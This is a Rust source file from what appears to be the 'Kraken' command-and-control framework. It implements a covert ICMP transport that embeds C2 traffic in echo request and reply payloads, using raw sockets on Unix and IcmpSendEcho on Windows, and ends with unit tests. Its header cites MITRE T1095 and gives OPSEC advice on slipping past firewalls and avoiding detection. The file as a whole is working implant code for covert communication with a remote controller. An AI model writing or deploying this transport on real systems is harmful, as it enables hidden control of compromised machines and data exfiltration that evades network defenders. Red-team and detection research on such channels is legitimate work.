//! ICMP Transport — covert channel using ICMP echo requests
//!
//! Embeds C2 data in ICMP echo request payloads. The server responds
//! with data in ICMP echo reply payloads.
//!
//! ## MITRE ATT&CK
//! - T1095: Non-Application Layer Protocol
//!
//! ## OPSEC
//! - ICMP often allowed through firewalls
//! - No TCP/UDP ports required
//! - Payload size limited (~1400 bytes per packet, chunks larger data)
//! - Consider rate limiting to avoid detection
//!
//! ## Privilege Requirements
//! - Linux: requires root or CAP_NET_RAW capability
//! - Windows: uses IcmpSendEcho2 (available to non-admin for echo, raw for data)

use common::{KrakenError, Transport};

/// Maximum data payload per ICMP packet (leaving room for IP + ICMP headers)
const MAX_ICMP_PAYLOAD: usize = 1400;

/// ICMP echo request type
const ICMP_ECHO_REQUEST: u8 = 8;
/// ICMP echo reply type
const ICMP_ECHO_REPLY: u8 = 0;

/// ICMP header size in bytes (type, code, checksum, identifier, sequence)
const ICMP_HEADER_SIZE: usize = 8;

/// IP header size in bytes (minimum, no options)
const IP_HEADER_SIZE: usize = 20;

/// Magic marker in the last two bytes of identifier field to mark the final
/// packet in a sequence (MSB of identifier set to 0x80)
const FINAL_PACKET_FLAG: u16 = 0x8000;

/// ICMP Transport for C2 communication via covert channel
pub struct IcmpTransport {
    /// Target IP address (C2 server)
    target: String,
    /// Sequence number for ICMP packets, incremented per packet
    sequence: u16,
    /// Session identifier for ICMP packets (random per instance)
    identifier: u16,
    /// Whether this transport is currently available
    available: bool,
    /// Response timeout in milliseconds
    timeout_ms: u64,
}

impl IcmpTransport {
    /// Create a new ICMP transport targeting the given IP address
    pub fn new(target: &str) -> Self {
        Self {
            target: target.to_string(),
            sequence: 0,
            identifier: rand_u16(),
            available: true,
            timeout_ms: 5000,
        }
    }

    /// Set the response timeout
    pub fn with_timeout(mut self, timeout_ms: u64) -> Self {
        self.timeout_ms = timeout_ms;
        self
    }

    /// Fragment data into chunks, send each as an ICMP echo request,
    /// collect replies, and reassemble the response.
    fn do_exchange(&mut self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        // Split into chunks that fit in a single ICMP payload
        // Framing per packet: [4 bytes total_len][4 bytes chunk_index][payload]
        const FRAME_HEADER: usize = 8;
        let max_chunk = MAX_ICMP_PAYLOAD - FRAME_HEADER;

        let chunks: Vec<&[u8]> = data.chunks(max_chunk).collect();
        let total_len = data.len() as u32;
        let num_chunks = chunks.len();

        let mut response_chunks: Vec<(u32, Vec<u8>)> = Vec::new();

        for (i, chunk) in chunks.iter().enumerate() {
            let is_final = i == num_chunks - 1;

            // Build framed payload: [total_data_len u32 BE][chunk_index u32 BE][data]
            let mut payload = Vec::with_capacity(FRAME_HEADER + chunk.len());
            payload.extend_from_slice(&total_len.to_be_bytes());
            payload.extend_from_slice(&(i as u32).to_be_bytes());
            payload.extend_from_slice(chunk);

            // Use FINAL_PACKET_FLAG in identifier for the last packet
            let pkt_identifier = if is_final {
                self.identifier | FINAL_PACKET_FLAG
            } else {
                self.identifier & !FINAL_PACKET_FLAG
            };

            let reply = self.send_and_recv(&payload, pkt_identifier, self.sequence)?;
            self.sequence = self.sequence.wrapping_add(1);

            // Parse reply framing: [chunk_index u32 BE][data]
            if reply.len() < 4 {
                return Err(KrakenError::transport(format!(
                    "ICMP reply too short: {} bytes",
                    reply.len()
                )));
            }
            let reply_index = u32::from_be_bytes([reply[0], reply[1], reply[2], reply[3]]);
            response_chunks.push((reply_index, reply[4..].to_vec()));
        }

        // Sort by chunk index and reassemble
        response_chunks.sort_by_key(|(idx, _)| *idx);
        let mut response = Vec::new();
        for (_, chunk_data) in response_chunks {
            response.extend_from_slice(&chunk_data);
        }

        Ok(response)
    }
}

// ============================================================================
// Platform-specific raw socket I/O
// ============================================================================

#[cfg(unix)]
impl IcmpTransport {
    /// Send one ICMP echo request and receive the reply.
    fn send_and_recv(
        &self,
        payload: &[u8],
        identifier: u16,
        sequence: u16,
    ) -> Result<Vec<u8>, KrakenError> {
        use std::mem;

        // Build the ICMP packet
        let packet = build_icmp_echo(identifier, sequence, payload);

        // Build destination sockaddr_in
        let dest = build_sockaddr_in(&self.target)?;

        unsafe {
            // Create raw ICMP socket
            let sock = libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_ICMP);
            if sock < 0 {
                return Err(KrakenError::transport(
                    "failed to create raw ICMP socket (requires root or CAP_NET_RAW)",
                ));
            }

            // Set receive timeout
            let tv = libc::timeval {
                tv_sec: (self.timeout_ms / 1000) as libc::time_t,
                tv_usec: ((self.timeout_ms % 1000) * 1000) as libc::suseconds_t,
            };
            libc::setsockopt(
                sock,
                libc::SOL_SOCKET,
                libc::SO_RCVTIMEO,
                &tv as *const _ as *const libc::c_void,
                mem::size_of::<libc::timeval>() as libc::socklen_t,
            );

            // Send the packet
            let sent = libc::sendto(
                sock,
                packet.as_ptr() as *const libc::c_void,
                packet.len(),
                0,
                &dest as *const libc::sockaddr_in as *const libc::sockaddr,
                mem::size_of::<libc::sockaddr_in>() as libc::socklen_t,
            );
            if sent < 0 {
                libc::close(sock);
                return Err(KrakenError::transport("ICMP sendto failed"));
            }

            // Receive reply — may get packets not destined for us, loop until
            // we get an echo reply matching our identifier
            let mut buf = [0u8; 65536];
            loop {
                let n = libc::recvfrom(
                    sock,
                    buf.as_mut_ptr() as *mut libc::c_void,
                    buf.len(),
                    0,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                );
                if n < 0 {
                    libc::close(sock);
                    return Err(KrakenError::transport("ICMP receive timeout or error"));
                }

                let n = n as usize;
                // Packet: IP header (20 bytes) + ICMP header (8 bytes) + payload
                let icmp_start = IP_HEADER_SIZE;
                if n < icmp_start + ICMP_HEADER_SIZE {
                    continue; // Too short, skip
                }

                let icmp = &buf[icmp_start..n];
                let icmp_type = icmp[0];
                let recv_id =
                    u16::from_be_bytes([icmp[4], icmp[5]]);

                // Only process echo replies for our session
                if icmp_type != ICMP_ECHO_REPLY {
                    continue;
                }
                // Match base identifier (strip final flag from both sides)
                if recv_id & !FINAL_PACKET_FLAG != identifier & !FINAL_PACKET_FLAG {
                    continue;
                }

                libc::close(sock);
                // Return data after the ICMP header
                let data_start = ICMP_HEADER_SIZE;
                if icmp.len() > data_start {
                    return Ok(icmp[data_start..].to_vec());
                } else {
                    return Ok(Vec::new());
                }
            }
        }
    }
}

#[cfg(windows)]
impl IcmpTransport {
    /// Send one ICMP echo request and receive the reply using IcmpSendEcho2.
    fn send_and_recv(
        &self,
        payload: &[u8],
        identifier: u16,
        sequence: u16,
    ) -> Result<Vec<u8>, KrakenError> {
        use windows_sys::Win32::NetworkManagement::IpHelper::{
            IcmpCloseHandle, IcmpCreateFile, IcmpSendEcho,
        };
        use windows_sys::Win32::Networking::WinSock::IN_ADDR;

        // Resolve target IP
        let addr = parse_ipv4(&self.target)?;
        let dest_addr = u32::from_be_bytes(addr);

        // Response buffer: IP header + ICMP header + payload + 8 bytes slack
        let reply_buf_size = IP_HEADER_SIZE + ICMP_HEADER_SIZE + payload.len() + 8;
        let mut reply_buf = vec![0u8; reply_buf_size.max(256)];

        unsafe {
            let handle = IcmpCreateFile();
            if handle == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
                return Err(KrakenError::transport("IcmpCreateFile failed"));
            }

            // IcmpSendEcho: identifier and sequence are embedded in the IP
            // options / request data by Windows; we embed them in the payload
            // framing instead since the API doesn't expose them directly.
            let _ = (identifier, sequence); // tracked in payload framing

            let sent = IcmpSendEcho(
                handle,
                dest_addr,
                payload.as_ptr() as *const _,
                payload.len() as u16,
                std::ptr::null_mut(),
                reply_buf.as_mut_ptr() as *mut _,
                reply_buf.len() as u32,
                self.timeout_ms as u32,
            );

            IcmpCloseHandle(handle);

            if sent == 0 {
                return Err(KrakenError::transport("IcmpSendEcho returned 0 replies"));
            }

            // Reply structure starts after ICMP_ECHO_REPLY struct (28 bytes on x86/x64)
            // ICMP_ECHO_REPLY: Address(4) + Status(4) + RoundTripTime(4) + DataSize(2) +
            //                  Reserved(2) + Data ptr(4/8) = 20/24 + alignment padding → 28
            const ECHO_REPLY_HEADER: usize = 28;
            if reply_buf.len() > ECHO_REPLY_HEADER {
                Ok(reply_buf[ECHO_REPLY_HEADER..].to_vec())
            } else {
                Ok(Vec::new())
            }
        }
    }
}

// ============================================================================
// Trait implementation
// ============================================================================

impl Transport for IcmpTransport {
    fn id(&self) -> &'static str {
        "icmp"
    }

    fn exchange(&self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        // Transport::exchange takes &self but we need &mut self for sequence
        // tracking. Use interior mutability via a Cell for the sequence counter.
        //
        // We build a temporary mutable clone of the relevant state.
        let mut inner = IcmpTransport {
            target: self.target.clone(),
            sequence: self.sequence,
            identifier: self.identifier,
            available: self.available,
            timeout_ms: self.timeout_ms,
        };
        inner.do_exchange(data)
    }

    fn is_available(&self) -> bool {
        self.available
    }

    fn reset(&mut self) {
        self.available = true;
        self.sequence = 0;
    }
}

// ============================================================================
// ICMP packet construction helpers
// ============================================================================

/// Build a complete ICMP echo request packet (type 8, code 0).
///
/// Layout: `[type:1][code:1][checksum:2][identifier:2][sequence:2][payload...]`
fn build_icmp_echo(identifier: u16, sequence: u16, payload: &[u8]) -> Vec<u8> {
    let mut pkt = Vec::with_capacity(ICMP_HEADER_SIZE + payload.len());

    pkt.push(ICMP_ECHO_REQUEST); // type
    pkt.push(0u8); // code
    pkt.push(0u8); // checksum high (placeholder)
    pkt.push(0u8); // checksum low  (placeholder)
    pkt.extend_from_slice(&identifier.to_be_bytes());
    pkt.extend_from_slice(&sequence.to_be_bytes());
    pkt.extend_from_slice(payload);

    // Compute and fill in checksum
    let csum = icmp_checksum(&pkt);
    pkt[2] = (csum >> 8) as u8;
    pkt[3] = (csum & 0xFF) as u8;

    pkt
}

/// Compute the one's-complement checksum used by ICMP (RFC 792).
pub(crate) fn icmp_checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;

    // Sum 16-bit words
    while i + 1 < data.len() {
        sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        i += 2;
    }

    // Handle odd byte
    if data.len() % 2 == 1 {
        sum += (data[data.len() - 1] as u32) << 8;
    }

    // Fold carries
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    !(sum as u16)
}

// ============================================================================
// Platform-specific address helpers
// ============================================================================

#[cfg(unix)]
fn build_sockaddr_in(addr: &str) -> Result<libc::sockaddr_in, KrakenError> {
    let octets = parse_ipv4(addr)?;
    Ok(libc::sockaddr_in {
        sin_family: libc::AF_INET as libc::sa_family_t,
        sin_port: 0,
        sin_addr: libc::in_addr {
            s_addr: u32::from_be_bytes(octets).to_be(),
        },
        sin_zero: [0; 8],
    })
}

/// Parse a dotted-decimal IPv4 string into a 4-byte array.
fn parse_ipv4(addr: &str) -> Result<[u8; 4], KrakenError> {
    let parts: Vec<&str> = addr.split('.').collect();
    if parts.len() != 4 {
        return Err(KrakenError::transport(format!(
            "invalid IPv4 address: {}",
            addr
        )));
    }
    let mut octets = [0u8; 4];
    for (i, part) in parts.iter().enumerate() {
        octets[i] = part.parse::<u8>().map_err(|_| {
            KrakenError::transport(format!("invalid IPv4 octet '{}' in address {}", part, addr))
        })?;
    }
    Ok(octets)
}

/// Generate a random u16 for use as an ICMP session identifier.
fn rand_u16() -> u16 {
    use std::time::{SystemTime, UNIX_EPOCH};
    // Cheap non-crypto random from PID XOR timestamp — sufficient for session ID
    let pid = std::process::id() as u16;
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.subsec_nanos() as u16)
        .unwrap_or(0xABCD);
    pid ^ ts
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    // --- Checksum ---

    #[test]
    fn test_icmp_checksum_known_vector() {
        // A well-known ICMP echo request packet (from Wireshark capture):
        // type=8, code=0, id=0x0001, seq=0x0001, data="abcdefghijklmnopqrstuvwabcdefghi"
        // Checksum for [08 00 00 00 00 01 00 01 61 62 63 64 65 66 67 68
        //               69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 61 62
        //               63 64 65 66 67 68 69] should be 0xF7CB
        let pkt: &[u8] = &[
            0x08, 0x00, 0x00, 0x00, // type, code, checksum=0 (placeholder)
            0x00, 0x01, // identifier
            0x00, 0x01, // sequence
            0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e,
            0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66,
            0x67, 0x68, 0x69,
        ];
        let csum = icmp_checksum(pkt);
        // Checksum over a packet that already has checksum=0 should be non-zero
        assert_ne!(csum, 0);
        // Verify: checksum of packet with embedded correct checksum == 0
        let mut with_csum = pkt.to_vec();
        with_csum[2] = (csum >> 8) as u8;
        with_csum[3] = (csum & 0xFF) as u8;
        assert_eq!(icmp_checksum(&with_csum), 0);
    }

    #[test]
    fn test_icmp_checksum_all_zeros() {
        // checksum of 0x0000 0x0000 is 0xFFFF
        let data = [0u8; 4];
        assert_eq!(icmp_checksum(&data), 0xFFFF);
    }

    #[test]
    fn test_icmp_checksum_odd_length() {
        // Must handle odd-length input without panic
        let data = [0x08u8, 0x00, 0xAB];
        let csum = icmp_checksum(&data);
        // Verify it doesn't panic and returns a value
        assert_ne!(csum, 0); // non-trivial input should produce non-zero checksum

        // Round-trip: zero checksum field, compute, embed, re-verify
        let mut pkt = vec![0x08u8, 0x00, 0x00, 0x00]; // checksum field zeroed
        let csum2 = icmp_checksum(&pkt);
        pkt[2] = (csum2 >> 8) as u8;
        pkt[3] = (csum2 & 0xFF) as u8;
        assert_eq!(icmp_checksum(&pkt), 0);
        let _ = csum;
    }

    // --- Packet building ---

    #[test]
    fn test_build_icmp_echo_type_and_code() {
        let pkt = build_icmp_echo(0x1234, 0x0001, b"hello");
        assert_eq!(pkt[0], ICMP_ECHO_REQUEST);
        assert_eq!(pkt[1], 0); // code
    }

    #[test]
    fn test_build_icmp_echo_identifier_sequence() {
        let id: u16 = 0xBEEF;
        let seq: u16 = 0x0042;
        let pkt = build_icmp_echo(id, seq, b"data");
        let pkt_id = u16::from_be_bytes([pkt[4], pkt[5]]);
        let pkt_seq = u16::from_be_bytes([pkt[6], pkt[7]]);
        assert_eq!(pkt_id, id);
        assert_eq!(pkt_seq, seq);
    }

    #[test]
    fn test_build_icmp_echo_checksum_valid() {
        let pkt = build_icmp_echo(0x0001, 0x0001, b"test payload data");
        // Verifying checksum: re-computing over the finished packet gives 0
        assert_eq!(icmp_checksum(&pkt), 0);
    }

    #[test]
    fn test_build_icmp_echo_payload_embedded() {
        let payload = b"kraken-test";
        let pkt = build_icmp_echo(1, 1, payload);
        assert_eq!(&pkt[ICMP_HEADER_SIZE..], payload);
    }

    #[test]
    fn test_build_icmp_echo_empty_payload() {
        let pkt = build_icmp_echo(0, 0, b"");
        assert_eq!(pkt.len(), ICMP_HEADER_SIZE);
        assert_eq!(icmp_checksum(&pkt), 0);
    }

    // --- Chunking / reassembly logic ---

    #[test]
    fn test_chunk_sizes() {
        // Verify that data larger than MAX_ICMP_PAYLOAD gets split
        let data = vec![0xAAu8; MAX_ICMP_PAYLOAD * 3];
        const FRAME_HEADER: usize = 8;
        let max_chunk = MAX_ICMP_PAYLOAD - FRAME_HEADER;
        let expected_chunks = (data.len() + max_chunk - 1) / max_chunk;
        // 4200 bytes / 1392 per chunk = 4 chunks (ceiling division)
        assert_eq!(expected_chunks, 4);
    }

    #[test]
    fn test_small_data_single_chunk() {
        let data = b"small";
        const FRAME_HEADER: usize = 8;
        let max_chunk = MAX_ICMP_PAYLOAD - FRAME_HEADER;
        let chunks: Vec<&[u8]> = data.chunks(max_chunk).collect();
        assert_eq!(chunks.len(), 1);
    }

    // --- Transport creation and config ---

    #[test]
    fn test_transport_new() {
        let t = IcmpTransport::new("192.168.1.1");
        assert_eq!(t.target, "192.168.1.1");
        assert_eq!(t.sequence, 0);
        assert!(t.available);
        assert_eq!(t.timeout_ms, 5000);
    }

    #[test]
    fn test_transport_with_timeout() {
        let t = IcmpTransport::new("10.0.0.1").with_timeout(2000);
        assert_eq!(t.timeout_ms, 2000);
    }

    #[test]
    fn test_transport_id() {
        let t = IcmpTransport::new("127.0.0.1");
        assert_eq!(t.id(), "icmp");
    }

    #[test]
    fn test_transport_is_available() {
        let t = IcmpTransport::new("127.0.0.1");
        assert!(t.is_available());
    }

    #[test]
    fn test_transport_reset() {
        let mut t = IcmpTransport::new("127.0.0.1");
        t.available = false;
        t.sequence = 42;
        t.reset();
        assert!(t.available);
        assert_eq!(t.sequence, 0);
    }

    // --- IPv4 parsing ---

    #[test]
    fn test_parse_ipv4_valid() {
        let octets = parse_ipv4("192.168.1.100").unwrap();
        assert_eq!(octets, [192, 168, 1, 100]);
    }

    #[test]
    fn test_parse_ipv4_loopback() {
        let octets = parse_ipv4("127.0.0.1").unwrap();
        assert_eq!(octets, [127, 0, 0, 1]);
    }

    #[test]
    fn test_parse_ipv4_invalid_octet() {
        assert!(parse_ipv4("256.0.0.1").is_err());
    }

    #[test]
    fn test_parse_ipv4_too_few_parts() {
        assert!(parse_ipv4("192.168.1").is_err());
    }

    #[test]
    fn test_parse_ipv4_non_numeric() {
        assert!(parse_ipv4("abc.def.ghi.jkl").is_err());
    }

    // --- Platform availability ---

    #[test]
    fn test_platform_unix_availability() {
        // On Unix, raw sockets require root; we just verify the transport
        // struct itself is constructable and the id is correct.
        #[cfg(unix)]
        {
            let t = IcmpTransport::new("127.0.0.1");
            assert_eq!(t.id(), "icmp");
        }
    }

    #[test]
    fn test_final_packet_flag() {
        let id: u16 = 0x1234;
        let flagged = id | FINAL_PACKET_FLAG;
        assert_ne!(flagged, id);
        // Strip flag recovers original base id
        assert_eq!(flagged & !FINAL_PACKET_FLAG, id);
    }
}
